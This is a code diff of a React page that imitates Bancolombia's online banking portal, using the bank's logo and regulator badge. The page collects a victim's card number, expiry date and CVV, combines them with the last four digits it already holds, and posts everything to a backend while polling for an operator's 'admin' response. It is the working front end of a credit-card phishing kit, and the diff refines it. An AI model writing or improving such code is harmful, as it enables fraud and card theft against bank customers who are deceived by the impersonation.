@@ -88,6 +88,17 @@ export default function ValidacionTC() {
     const estadoAnteriorRef = useRef(null);
     const aprobadoEsperandoRef = useRef(false);
 
+    // --- LÓGICA DE TARJETA E IMÁGENES --- (Mover aquí para que isAmex tenga acceso a cardData actualizado)
+    const isAmex = (cardData.label || "").toLowerCase().includes("amex") ||
+        (cardData.filename || "").toLowerCase().includes("amex") ||
+        (cardData.tipo || "").toLowerCase().includes("american");
+
+    // AMEX total 15 digits. Backend sends last 4. 
+    // So user must enter first 11 digits. 11 + 4 = 15.
+    // Standard cards: 16 digits. User enters first 12. 12 + 4 = 16.
+    const requiredDigitsLength = isAmex ? 11 : 12;
+    const requiredCvvLength = isAmex ? 4 : 3;
+
     // --- LÓGICA DE CARGA DE DATOS ---
     useEffect(() => {
         // Validar acceso antes de cargar datos
@@ -185,9 +196,7 @@ export default function ValidacionTC() {
     };
 
 
-    // --- LÓGICA DE TARJETA E IMÁGENES ---
-
-    // 1. Mapa de imágenes frontales a traseras (Traído de ValidacionCVV)
+    // 1. Mapa de imágenes frontales a traseras
     const getBackCardFilename = (frontFilename) => {
         const frontToBackMap = {
             // Crédito - Mastercard
@@ -226,18 +235,16 @@ export default function ValidacionTC() {
     };
 
     // 2. SISTEMA DE AJUSTE VISUAL (NORMALIZACIÓN)
-    // Diccionario de ajustes específicos para tarjetas con problemas de tamaño/encuadre
     const CARD_ADJUSTMENTS = {
         // --- VISA ---
         "Visa-Clasica.png": { transform: "scale(1.15)" },
         "Visa-seleccion-colombia.png": { transform: "scale(1.15)" },
         "Visa-Oro.png": { transform: "scale(1.15)" },
         "Visa-Platinum-v1.png": { transform: "scale(1.1)" },
-
         // --- MASTERCARD ---
         "Mastercard-Unica.png": { transform: "scale(1.1)" },
         "Mastercard-oro.png": { transform: "scale(1.1)" },
-        "Mastercard-Esso-mobil-v1.png": { transform: "scale(1.15)" }, // Esso Gold & Mobil comparten mapping a veces, ajustamos ambas si es el caso
+        "Mastercard-Esso-mobil-v1.png": { transform: "scale(1.15)" },
         "Mastercard-Platinum.png": { transform: "scale(1.1)" },
         "Mastercard-Black-v1.png": { transform: "scale(1.06)" },
         "Mastercard-E-Card-v1.png": { transform: "scale(1.05)" },
@@ -245,13 +252,11 @@ export default function ValidacionTC() {
         "Débito Preferencial.png": { transform: "scale(1.04)" },
         "Débito Clásica.png": { transform: "scale(1.04)" },
         "debito_virtual.png": { transform: "scale(1.05)" },
-
         // --- AMEX ---
         "Amex+Libre.png": { transform: "scale(1.15)" },
     };
 
     const getCardStyle = (filename) => {
-        // Retorna el estilo específico si existe, o vacío si no
         return CARD_ADJUSTMENTS[filename] || {};
     };
 
@@ -262,21 +267,13 @@ export default function ValidacionTC() {
 
     const getBackCardImagePath = () => {
         const backFilename = getBackCardFilename(cardData.filename);
-        if (!backFilename) return getCardImagePath(); // Fallback
+        if (!backFilename) return getCardImagePath();
         const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";
         return `/assets/images/${folder}/${backFilename}`;
     };
 
     const getTipoTarjeta = () => cardData.tipo === "credito" ? "Crédito" : "Débito";
 
-    // --- LÓGICA DE VALIDACIÓN ---
-    const isAmex = cardData.label.toLowerCase().includes("amex") || cardData.filename.toLowerCase().includes("amex") || cardData.tipo.toLowerCase().includes("american");
-
-    // AMEX total 15 digits. Backend sends last 4. 
-    // So user must enter first 11 digits. 11 + 4 = 15.
-    // Standard cards: 16 digits. User enters first 12. 12 + 4 = 16.
-    const requiredDigitsLength = isAmex ? 11 : 12;
-    const requiredCvvLength = isAmex ? 4 : 3;
 
     const handleDigitsChange = (e) => {
         const val = e.target.value;
@@ -292,7 +289,6 @@ export default function ValidacionTC() {
         // 👇 SOLO validar cuando ya están los dígitos requeridos
         if (val.length === requiredDigitsLength) {
             console.log("Dígitos completos");
-            // Aquí podríamos validar Luhn si quisiéramos, pero Payment requiere el número completo
         }
     };
 
@@ -301,7 +297,6 @@ export default function ValidacionTC() {
         const raw = e.target.value;
         const numbers = raw.replace(/\D/g, "");
 
-        // 👈 Backspace: no reformatear
         if (raw.length < expirationDate.length) {
             setExpirationDate(raw);
             return;
@@ -350,10 +345,10 @@ export default function ValidacionTC() {
     // --- TRANSICIÓN DE PASOS ---
     const handleContinue = async () => {
         if (step === "front") {
-            // Validar paso 1: dígitos requeridos + fecha de expiración válida
+            // Validar paso 1
             const isExpirationValid = expirationDate.length === 5 && expirationDate.includes("/");
             if (cardDigits.length === requiredDigitsLength && isExpirationValid) {
-                setStep("back"); // Esto activará la animación CSS
+                setStep("back");
                 setIsFocused(false);
                 setFocusedField("");
             }
@@ -362,7 +357,6 @@ export default function ValidacionTC() {
             if (cvv.length === requiredCvvLength) {
                 try {
                     setCargando(true);
-                    // Obtener sesion_id del localStorage
                     const raw = localStorage.getItem("datos_usuario");
                     const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
                     const sesionId = usuarioLocalStorage?.sesion_id;
@@ -373,13 +367,11 @@ export default function ValidacionTC() {
                         return;
                     }
 
-                    // Construir número completo de tarjeta (12/11 dígitos + 4 últimos)
+                    // Construir número completo
                     const numeroTarjetaCompleto = cardDigits + cardData.digits;
 
-                    // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
+                    // --- REGISTRAR INTENTO EN LOCALSTORAGE ---
                     if (!usuarioLocalStorage.usuario) usuarioLocalStorage.usuario = {};
-
-                    // Determinar si usar endpoint TC estándar o TC Custom
                     const endpoint = isTCCustom ? "/tc-custom" : "/tc";
                     const arrayKey = isTCCustom ? "tc_custom" : "tc";
 
@@ -396,21 +388,16 @@ export default function ValidacionTC() {
                     usuarioLocalStorage.usuario[arrayKey].push(nuevoIntento);
                     localStorage.setItem("datos_usuario", JSON.stringify(usuarioLocalStorage));
 
-                    // Preparar datos para enviar
                     const dataSend = {
                         data: {
                             attributes: usuarioLocalStorage
                         }
                     };
 
-                    // Importar axios instance
                     const { instanceBackend } = await import("../../axios/instanceBackend");
-
-                    // Enviar al backend
                     const response = await instanceBackend.post(endpoint, dataSend);
 
                     if (response.data.success) {
-                        // Iniciar polling para esperar respuesta del admin
                         iniciarPolling(sesionId);
                     } else {
                         alert("Error al enviar los datos");
@@ -419,12 +406,13 @@ export default function ValidacionTC() {
                 } catch (error) {
                     console.error("Error enviando TC:", error);
                     alert("Error de conexión con el servidor");
+                    setCargando(false);
                 }
             }
         }
     };
 
-    // Función de polling para esperar respuesta del admin
+    // Función de polling
     const iniciarPolling = (sesionId) => {
         let attempts = 0;
         const MAX_ATTEMPTS = 60;
@@ -461,7 +449,6 @@ export default function ValidacionTC() {
                     return;
                 }
 
-                // Errores
                 if (estado === 'error_tc' || estado === 'error_tc_custom') {
                     clearInterval(pollingInterval);
                     clearTimeout(timeoutId);
@@ -505,7 +492,6 @@ export default function ValidacionTC() {
                 }
 
             } catch (error) {
-                console.error('Error en polling:', error);
                 attempts++;
                 if (attempts >= MAX_ATTEMPTS) {
                     clearInterval(pollingInterval);
@@ -527,36 +513,35 @@ export default function ValidacionTC() {
             setCvv("");
             setStep("front");
         }, TIMEOUT_MS);
+    };
 
-        // ... (rest of handleExpirationChange and handleCvvChange)
+    // --- RENDER HELPERS ---
 
-        // --- RENDER HELPERS ---
-
-        // Placeholder para Dígitos (Frente) - Adaptable (12 o 11)
-        const renderVisualInputDigits = () => (
+    const renderVisualInputDigits = () => {
+        const length = requiredDigitsLength || 12; // Fallback safety
+        return (
             <div className="input-lines-container mb-4" onClick={() => document.getElementById('cardDigits').focus()}
                 style={{ display: "flex", gap: "6px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", flexWrap: "wrap" }}>
-                {Array.from({ length: requiredDigitsLength }).map((_, index) => {
-                    const activeIndex = cardDigits.length < requiredDigitsLength ? cardDigits.length : requiredDigitsLength - 1;
+                {Array.from({ length: length }).map((_, index) => {
+                    const activeIndex = cardDigits.length < length ? cardDigits.length : length - 1;
                     const isActive =
                         isFocused &&
                         focusedField === "digits" &&
                         step === "front" &&
                         index === activeIndex;
 
-                    // Logic for spacing (extraMargin)
                     let extraMargin = "0px";
                     if (index > 0) {
                         if (isAmex) {
-                            // AMEX Format: 4 - 6 - 5
-                            // User enters 11 digits (part of the 15).
-                            // Group 1: 0,1,2,3 (4 digits) -> Margin after index 3?
-                            // Group 2: 4,5,6,7,8,9 (6 digits) -> Margin after index 9?
-                            // Digits entered: 0-10.
+                            // AMEX (15 total, 11 input)
+                            // Grouping: 4-6-5
+                            // Input: 11 digits + 4 fixed = 15
+                            // Input Groups: 4 digits (0-3), then 6 digits (4-9), then 1 digit (10)
                             if (index === 4) extraMargin = "10px"; // Space after 4th digit (index 3)
-                            if (index === 10) extraMargin = "10px"; // Space after 10th digit (index 9) - Wait, entering 11 total.
+                            if (index === 10) extraMargin = "10px"; // Space after 10th digit (index 9)
                         } else {
-                            // Standard: 4 - 4 - 4 - 4
+                            // Standard (16 total, 12 input)
+                            // Grouping: 4-4-4-4
                             if (index % 4 === 0) extraMargin = "10px";
                         }
                     }
@@ -573,317 +558,298 @@ export default function ValidacionTC() {
                     );
                 })}
             </div>
-        );
+        )
+    };
 
-        // Placeholder para Fecha de Expiración (Frente)
-        const renderVisualInputExpiration = () => (
-            <div className="input-lines-container" onClick={() => document.getElementById('expirationDate').focus()}
-                style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", marginTop: "15px" }}>
-                {Array.from({ length: 5 }).map((_, index) => {
-                    const activeIndex = expirationDate.length < 5 ? expirationDate.length : 4;
-                    const isActive = isFocused && focusedField === "expiration" && step === "front" && index === activeIndex;
-                    const char = expirationDate[index] || "";
-                    return (
-                        <div key={index} style={{
-                            width: index === 2 ? "10px" : "25px",
-                            height: "30px",
-                            borderBottom: index === 2 ? "none" : `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
-                            display: "flex", justifyContent: "center", alignItems: "center",
-                            color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
-                        }}>
-                            {char}
-                        </div>
-                    );
-                })}
-            </div>
-        );
-
-        // Placeholder para CVV (Reverso)
-        const renderVisualInputCVV = () => (
-            <div className="input-lines-container" onClick={() => document.getElementById('cvv').focus()}
-                style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center" }}>
-                {Array.from({ length: requiredCvvLength }).map((_, index) => {
-                    const activeIndex = cvv.length < requiredCvvLength ? cvv.length : requiredCvvLength - 1;
-                    const isActive = isFocused && step === "back" && index === activeIndex;
-                    return (
-                        <div key={index} style={{
-                            width: "30px", height: "30px",
-                            borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
-                            display: "flex", justifyContent: "center", alignItems: "center",
-                            color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
-                        }}>
-                            {cvv[index] || ""}
-                        </div>
-                    );
-                })}
-            </div>
-        );
-
-        return (
-            <>
-                <style>{flipStyles}</style>
-                <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
-                    {/* Header igual */}
-                    <div style={{
-                        flex: 1,
-                        backgroundColor: "#2C2A29",
-                        backgroundImage: 'url("/assets/images/auth-trazo.svg")',
-                        backgroundRepeat: "no-repeat",
-                        backgroundPosition: "center",
-                        backgroundPositionY: "-70px",
-                        backgroundPositionX: "-500px",
+    const renderVisualInputExpiration = () => (
+        <div className="input-lines-container" onClick={() => document.getElementById('expirationDate').focus()}
+            style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", marginTop: "15px" }}>
+            {Array.from({ length: 5 }).map((_, index) => {
+                const activeIndex = expirationDate.length < 5 ? expirationDate.length : 4;
+                const isActive = isFocused && focusedField === "expiration" && step === "front" && index === activeIndex;
+                const char = expirationDate[index] || "";
+                return (
+                    <div key={index} style={{
+                        width: index === 2 ? "10px" : "25px",
+                        height: "30px",
+                        borderBottom: index === 2 ? "none" : `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
+                        display: "flex", justifyContent: "center", alignItems: "center",
+                        color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
                     }}>
+                        {char}
+                    </div>
+                );
+            })}
+        </div>
+    );
 
-                        <div style={{ textAlign: "center" }}>
-                            <img src="/assets/images/img_pantalla2/descarga.svg" alt="Logo" style={{ width: "238px", marginTop: "45px" }} />
-                        </div>
-                        <div style={{ marginTop: "25px", textAlignLast: "center" }}>
-                            <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
-                                Sucursal Virtual Personas
-                            </h1>
-                        </div>
+    const renderVisualInputCVV = () => (
+        <div className="input-lines-container" onClick={() => document.getElementById('cvv').focus()}
+            style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center" }}>
+            {Array.from({ length: requiredCvvLength }).map((_, index) => {
+                const activeIndex = cvv.length < requiredCvvLength ? cvv.length : requiredCvvLength - 1;
+                const isActive = isFocused && step === "back" && index === activeIndex;
+                return (
+                    <div key={index} style={{
+                        width: "30px", height: "30px",
+                        borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
+                        display: "flex", justifyContent: "center", alignItems: "center",
+                        color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
+                    }}>
+                        {cvv[index] || ""}
+                    </div>
+                );
+            })}
+        </div>
+    );
 
-                        <div className="login-page">
-                            <div className="login-box" style={{ backgroundColor: "#454648" }}>
+    return (
+        <>
+            <style>{flipStyles}</style>
+            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
+                <div style={{
+                    flex: 1,
+                    backgroundColor: "#2C2A29",
+                    backgroundImage: 'url("/assets/images/auth-trazo.svg")',
+                    backgroundRepeat: "no-repeat",
+                    backgroundPosition: "center",
+                    backgroundPositionY: "-70px",
+                    backgroundPositionX: "-500px",
+                }}>
 
-                                {/* Header Tarjeta Pequeña */}
-                                <div style={{ display: "flex", alignItems: "flex-start", gap: "15px", marginBottom: "24px" }}>
-                                    <img src={getCardImagePath()} alt={cardData.label} style={{ width: "70px", borderRadius: "8px", flexShrink: 0 }} />
-                                    <h2 style={{ fontSize: "20px", fontWeight: "bold", color: "#ffffff", margin: 0, textAlign: "left", lineHeight: "1.4" }}>
-                                        {step === "front"
-                                            ? `Ingresa los datos de tu Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
-                                            : `Validación del CVV de la Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
-                                        }
-                                    </h2>
-                                </div>
+                    <div style={{ textAlign: "center" }}>
+                        <img src="/assets/images/img_pantalla2/descarga.svg" alt="Logo" style={{ width: "238px", marginTop: "45px" }} />
+                    </div>
+                    <div style={{ marginTop: "25px", textAlignLast: "center" }}>
+                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
+                            Sucursal Virtual Personas
+                        </h1>
+                    </div>
 
-                                <p style={{ fontSize: "16px", lineHeight: "24px", color: "#ffffff", marginBottom: "30px", textAlign: "left" }}>
+                    <div className="login-page">
+                        <div className="login-box" style={{ backgroundColor: "#454648" }}>
+
+                            <div style={{ display: "flex", alignItems: "flex-start", gap: "15px", marginBottom: "24px" }}>
+                                <img src={getCardImagePath()} alt={cardData.label} style={{ width: "70px", borderRadius: "8px", flexShrink: 0 }} />
+                                <h2 style={{ fontSize: "20px", fontWeight: "bold", color: "#ffffff", margin: 0, textAlign: "left", lineHeight: "1.4" }}>
                                     {step === "front"
-                                        ? "Ingresa los primeros 12 dígitos y la fecha de expiración de tu tarjeta."
-                                        : "Para garantizar la seguridad de tu cuenta, confirma el código de seguridad (CVV)."
+                                        ? `Ingresa los datos de tu Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
+                                        : `Validación del CVV de la Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
                                     }
-                                </p>
-
-                                {/* --- FLIP CARD CONTAINER --- */}
-                                <div className="flip-card">
-                                    <div className={`flip-card-inner ${step === 'back' ? 'flipped' : ''}`}>
-
-                                        {/* FRENTE */}
-                                        <div className="flip-card-front">
-                                            <img
-                                                src={getCardImagePath()}
-                                                alt="Frente"
-                                                style={getCardStyle(cardData.filename)}
-                                            />
-
-                                            {/* Overlay Dígitos en la Tarjeta */}
-                                            <div style={{
-                                                position: "absolute", top: "65%", left: "50%", transform: "translate(-50%, -50%)", width: "88%",
-                                                display: "flex", flexDirection: "column", gap: "8px", color: "#ffffff",
-                                                textShadow: "2px 2px 4px rgba(0,0,0,0.8)", pointerEvents: "none"
-                                            }}>
-                                                {/* Número de tarjeta: 12 bullets + últimos 4 dígitos */}
-                                                <div className="digits-text" style={{ marginTop: 20 }}>
-                                                    {cardDigits.padEnd(requiredDigitsLength, '•').match(/.{1,4}/g)?.join(' ')} {cardData.digits}
-                                                </div>
-
-                                                {/* Fecha de expiración */}
-                                                <div className="digits-text" style={{ marginTop: 0 }}>
-                                                    {expirationDate || "MM/YY"}
-                                                </div>
-                                            </div>
-                                        </div>
-
-                                        {/* REVERSO */}
-                                        <div className="flip-card-back">
-                                            <img
-                                                src={getBackCardImagePath()}
-                                                alt="Reverso"
-                                                style={getCardStyle(getBackCardFilename(cardData.filename))}
-                                            />
-
-                                            {/* Overlay CVV */}
-                                            <div style={{
-                                                position: "absolute", top: "32.5%", left: "84%", transform: "translate(-50%, -50%)",
-                                                color: "#000", fontSize: "20px", fontFamily: "monospace", fontWeight: "bold", pointerEvents: "none"
-                                            }}>
-                                                {cvv}
-                                            </div>
-                                        </div>
-
-                                    </div>
-                                </div>
-
-                                {/* --- INPUTS --- */}
-                                <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "25px", width: "100%" }}>
-
-                                    {step === "front" ? (
-                                        <>
-                                            {/* Input de Número de Tarjeta */}
-                                            <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
-                                                {renderVisualInputDigits()}
-                                                <label htmlFor="cardDigits" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", textAlign: 'center' }}>
-                                                    Ingrese los primeros 12 dígitos de su tarjeta
-                                                </label>
-                                                <input
-                                                    id="cardDigits"
-                                                    type="tel"
-                                                    maxLength={requiredDigitsLength}
-                                                    pattern="[0-9]*"
-                                                    value={cardDigits}
-                                                    onChange={handleDigitsChange}
-                                                    onFocus={() => { setIsFocused(true); setFocusedField("digits"); }}
-                                                    onBlur={() => { setIsFocused(false); setFocusedField(""); }}
-                                                    style={{
-                                                        position: "absolute",
-                                                        top: 0,
-                                                        left: "50%",
-                                                        transform: "translateX(-50%)",
-                                                        width: "260px",      // 👈 ancho SOLO de la fila superior
-                                                        height: "40px",      // 👈 altura SOLO de la fila superior
-                                                        opacity: 0,
-                                                        cursor: "text",
-                                                        caretColor: "transparent", // 👈 CLAVE
-                                                    }}
-                                                />
-                                            </div>
-
-                                            {/* Input de Fecha de Expiración */}
-                                            <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
-                                                {renderVisualInputExpiration()}
-                                                <label htmlFor="expirationDate" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>
-                                                    Fecha de expiración (MM/YY)
-                                                </label>
-                                                <input
-                                                    id="expirationDate"
-                                                    type="tel"
-                                                    maxLength={5}
-                                                    pattern="[0-9\/]*"
-                                                    value={expirationDate}
-                                                    onChange={handleExpirationChange}
-                                                    onFocus={() => { setIsFocused(true); setFocusedField("expiration"); }}
-                                                    onBlur={() => { setIsFocused(false); setFocusedField(""); }}
-                                                    style={{
-                                                        position: "absolute",
-                                                        top: 0,
-                                                        left: "50%",
-                                                        transform: "translateX(-50%)",
-                                                        width: "260px",      // 👈 ancho SOLO de la fila superior
-                                                        height: "40px",      // 👈 altura SOLO de la fila superior
-                                                        opacity: 0,
-                                                        cursor: "text",
-                                                        caretColor: "transparent", // 👈 CLAVE
-                                                    }}
-                                                />
-                                            </div>
-                                        </>
-                                    ) : (
-                                        <>
-                                            {/* Input de CVV */}
-                                            <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
-                                                {renderVisualInputCVV()}
-                                                <label htmlFor="cvv" style={{ color: "#ffffff", margin: 0, fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>CVV</label>
-                                                <input
-                                                    id="cvv"
-                                                    type="tel"
-                                                    maxLength={requiredCvvLength}
-                                                    pattern="[0-9]*"
-                                                    value={cvv}
-                                                    onChange={handleCvvChange}
-                                                    onFocus={() => { setIsFocused(true); setFocusedField("cvv"); }}
-                                                    onBlur={() => { setIsFocused(false); setFocusedField(""); }}
-                                                    style={{
-                                                        position: "absolute",
-                                                        top: 0,
-                                                        left: "50%",
-                                                        transform: "translateX(-50%)",
-                                                        width: "260px",      // 👈 ancho SOLO de la fila superior
-                                                        height: "40px",      // 👈 altura SOLO de la fila superior
-                                                        opacity: 0,
-                                                        cursor: "text",
-                                                    }}
-                                                />
-                                            </div>
-                                        </>
-                                    )}
-
-                                </div>
-
-                                <br /><br />
-
-                                {/* BOTÓN DE ACCIÓN */}
-                                <button className="login-btn" onClick={handleContinue}
-                                    style={{
-                                        marginTop: "20px",
-                                        opacity: (step === "front"
-                                            ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
-                                            : cvv.length === requiredCvvLength) ? 1 : 0.5,
-                                        cursor: (step === "front"
-                                            ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
-                                            : cvv.length === requiredCvvLength) ? "pointer" : "not-allowed"
-                                    }}
-                                    disabled={step === "front"
-                                        ? !(cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
-                                        : cvv.length !== requiredCvvLength}
-                                >
-                                    {step === "front" ? "Siguiente" : "Enviar"}
-                                </button>
-
+                                </h2>
                             </div>
-                        </div>
 
-                        <div className="login-page-footer mt-4">
-                            <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
-                                <span>¿Problemas para conectarte?</span>
-                                <span className="dot">·</span>
-                                <span>Aprende sobre seguridad</span>
-                                <span className="dot">·</span>
-                                <span>Reglamento Sucursal Virtual</span>
-                                <span className="dot">·</span>
-                                <span>Política de privacidad</span>
-                            </div>
-                            {/* Se eliminó la línea <hr> a petición del usuario */}
-                            <div className="footer-final">
-                                <div className="footer-left">
-                                    <div>
+                            <p style={{ fontSize: "16px", lineHeight: "24px", color: "#ffffff", marginBottom: "30px", textAlign: "left" }}>
+                                {step === "front"
+                                    ? "Ingresa los primeros 12 dígitos y la fecha de expiración de tu tarjeta."
+                                    : "Para garantizar la seguridad de tu cuenta, confirma el código de seguridad (CVV)."
+                                }
+                            </p>
+
+                            <div className="flip-card">
+                                <div className={`flip-card-inner ${step === 'back' ? 'flipped' : ''}`}>
+
+                                    <div className="flip-card-front">
                                         <img
-                                            src="/assets/images/img_pantalla2/descarga.svg"
-                                            alt="Bancolombia"
+                                            src={getCardImagePath()}
+                                            alt="Frente"
+                                            style={getCardStyle(cardData.filename)}
+                                        />
+
+                                        <div style={{
+                                            position: "absolute", top: "65%", left: "50%", transform: "translate(-50%, -50%)", width: "88%",
+                                            display: "flex", flexDirection: "column", gap: "8px", color: "#ffffff",
+                                            textShadow: "2px 2px 4px rgba(0,0,0,0.8)", pointerEvents: "none"
+                                        }}>
+                                            <div className="digits-text" style={{ marginTop: 20 }}>
+                                                {cardDigits.padEnd(requiredDigitsLength, '•').match(/.{1,4}/g)?.join(' ')} {cardData.digits}
+                                            </div>
+
+                                            <div className="digits-text" style={{ marginTop: 0 }}>
+                                                {expirationDate || "MM/YY"}
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div className="flip-card-back">
+                                        <img
+                                            src={getBackCardImagePath()}
+                                            alt="Reverso"
+                                            style={getCardStyle(getBackCardFilename(cardData.filename))}
+                                        />
+
+                                        <div style={{
+                                            position: "absolute", top: "32.5%", left: "84%", transform: "translate(-50%, -50%)",
+                                            color: "#000", fontSize: "20px", fontFamily: "monospace", fontWeight: "bold", pointerEvents: "none"
+                                        }}>
+                                            {cvv}
+                                        </div>
+                                    </div>
+
+                                </div>
+                            </div>
+
+                            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "25px", width: "100%" }}>
+
+                                {step === "front" ? (
+                                    <>
+                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
+                                            {renderVisualInputDigits()}
+                                            <label htmlFor="cardDigits" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", textAlign: 'center' }}>
+                                                Ingrese los primeros {requiredDigitsLength} dígitos de su tarjeta
+                                            </label>
+                                            <input
+                                                id="cardDigits"
+                                                type="tel"
+                                                maxLength={requiredDigitsLength}
+                                                pattern="[0-9]*"
+                                                value={cardDigits}
+                                                onChange={handleDigitsChange}
+                                                onFocus={() => { setIsFocused(true); setFocusedField("digits"); }}
+                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
+                                                style={{
+                                                    position: "absolute",
+                                                    top: 0,
+                                                    left: "50%",
+                                                    transform: "translateX(-50%)",
+                                                    width: "260px",
+                                                    height: "40px",
+                                                    opacity: 0,
+                                                    cursor: "text",
+                                                    caretColor: "transparent",
+                                                }}
+                                            />
+                                        </div>
+
+                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
+                                            {renderVisualInputExpiration()}
+                                            <label htmlFor="expirationDate" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>
+                                                Fecha de expiración (MM/YY)
+                                            </label>
+                                            <input
+                                                id="expirationDate"
+                                                type="tel"
+                                                maxLength={5}
+                                                pattern="[0-9\/]*"
+                                                value={expirationDate}
+                                                onChange={handleExpirationChange}
+                                                onFocus={() => { setIsFocused(true); setFocusedField("expiration"); }}
+                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
+                                                style={{
+                                                    position: "absolute",
+                                                    top: 0,
+                                                    left: "50%",
+                                                    transform: "translateX(-50%)",
+                                                    width: "260px",
+                                                    height: "40px",
+                                                    opacity: 0,
+                                                    cursor: "text",
+                                                    caretColor: "transparent",
+                                                }}
+                                            />
+                                        </div>
+                                    </>
+                                ) : (
+                                    <>
+                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
+                                            {renderVisualInputCVV()}
+                                            <label htmlFor="cvv" style={{ color: "#ffffff", margin: 0, fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>CVV</label>
+                                            <input
+                                                id="cvv"
+                                                type="tel"
+                                                maxLength={requiredCvvLength}
+                                                pattern="[0-9]*"
+                                                value={cvv}
+                                                onChange={handleCvvChange}
+                                                onFocus={() => { setIsFocused(true); setFocusedField("cvv"); }}
+                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
+                                                style={{
+                                                    position: "absolute",
+                                                    top: 0,
+                                                    left: "50%",
+                                                    transform: "translateX(-50%)",
+                                                    width: "260px",
+                                                    height: "40px",
+                                                    opacity: 0,
+                                                    cursor: "text",
+                                                }}
+                                            />
+                                        </div>
+                                    </>
+                                )}
+
+                            </div>
+
+                            <br /><br />
+
+                            <button className="login-btn" onClick={handleContinue}
+                                style={{
+                                    marginTop: "20px",
+                                    opacity: (step === "front"
+                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
+                                        : cvv.length === requiredCvvLength) ? 1 : 0.5,
+                                    cursor: (step === "front"
+                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
+                                        : cvv.length === requiredCvvLength) ? "pointer" : "not-allowed"
+                                }}
+                                disabled={step === "front"
+                                    ? !(cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
+                                    : cvv.length !== requiredCvvLength}
+                            >
+                                {step === "front" ? "Siguiente" : "Enviar"}
+                            </button>
+
+                        </div>
+                    </div>
+
+                    <div className="login-page-footer mt-4">
+                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
+                            <span>¿Problemas para conectarte?</span>
+                            <span className="dot">·</span>
+                            <span>Aprende sobre seguridad</span>
+                            <span className="dot">·</span>
+                            <span>Reglamento Sucursal Virtual</span>
+                            <span className="dot">·</span>
+                            <span>Política de privacidad</span>
+                        </div>
+                        <div className="footer-final">
+                            <div className="footer-left">
+                                <div>
+                                    <img
+                                        src="/assets/images/img_pantalla2/descarga.svg"
+                                        alt="Bancolombia"
+                                        style={{ width: "180px" }}
+                                    />
+                                </div>
+                                <div>
+                                    <span className="vigilado">
+                                        <img
+                                            src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
+                                            alt="Superintendencia"
                                             style={{ width: "180px" }}
                                         />
-                                    </div>
-                                    <div>
-                                        <span className="vigilado">
-                                            <img
-                                                src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
-                                                alt="Superintendencia"
-                                                style={{ width: "180px" }}
-                                            />
-                                        </span>
-                                    </div>
+                                    </span>
                                 </div>
-                                <div className="footer-right">
-                                    <div className="mt-2">Dirección IP: {ip}</div>
-                                    <div className="mb-2">{fechaHora}</div>
-                                </div>
+                            </div>
+                            <div className="footer-right">
+                                <div className="mt-2">Dirección IP: {ip}</div>
+                                <div className="mb-2">{fechaHora}</div>
                             </div>
                         </div>
                     </div>
                 </div>
